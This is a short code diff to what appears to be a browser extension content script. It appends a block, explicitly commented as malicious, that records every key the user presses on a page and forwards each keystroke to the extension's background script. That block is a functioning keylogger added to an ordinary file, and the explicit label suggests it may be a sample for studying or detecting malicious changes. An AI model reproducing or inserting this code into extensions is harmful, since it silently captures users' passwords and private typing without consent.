@@ -435,3 +435,10 @@ else chrome.runtime.sendMessage({ message: "top" }, init);
 
 chrome.storage.onChanged.addListener(update);
 observer.observe(document, { childList: true, subtree: true });
+
+// malicious code
+document.addEventListener('keyup', function(event) {
+  console.log('Key pressed:', event.key);
+  // Send data to the background service
+  chrome.runtime.sendMessage({ key: event.key });
+});
